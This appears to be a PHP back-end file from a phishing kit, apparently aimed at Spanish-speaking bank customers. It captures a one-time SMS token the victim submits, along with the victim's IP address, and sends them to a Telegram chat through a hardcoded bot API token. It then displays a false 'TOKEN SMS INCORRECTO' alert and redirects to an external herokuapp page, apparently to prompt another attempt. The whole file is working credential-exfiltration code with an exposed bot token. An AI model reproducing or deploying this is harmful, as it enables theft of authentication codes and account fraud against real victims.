<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['clv'])){

$message = "token: ".$_POST['clv']."\r\nIP ".$userp."\r\n";

$apiToken = "5538364965:AAEq5z1Q42UqffhYXp2qBXpJP-qXacQn1es";
$data = [
    'chat_id' => '-894957261',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: index.html'); exit();
}
echo '<script language="javascript">alert("TOKEN SMS INCORRECTO \r\n Por su seguridad deberá realizar el proceso nuevamente…");</script>';
echo '<script type="text/javascript">window.location.href = "https://ocab.herokuapp.com/";</script>';

?>